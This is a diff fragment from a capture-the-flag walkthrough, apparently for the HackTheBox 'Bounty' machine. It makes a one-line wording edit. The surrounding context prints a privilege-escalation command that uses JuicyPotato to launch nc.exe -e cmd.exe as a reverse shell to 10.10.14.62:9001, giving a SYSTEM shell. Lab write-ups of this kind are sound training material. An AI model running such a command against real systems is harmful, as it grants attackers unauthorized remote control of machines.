@@ -152,6 +152,6 @@ Execute the exploit with:
 C:\Users\merlin\AppData\Local\Temp\jp.exe -l 9001 -p C:\windows\system32\cmd.exe -a "/c C:\Users\merlin\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.14.62 9001" -t *
 ```
 
-This should yield you shell access as the system:
+This should yield you a shell as the system:
 
 ![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bounty/img/root-19.png)
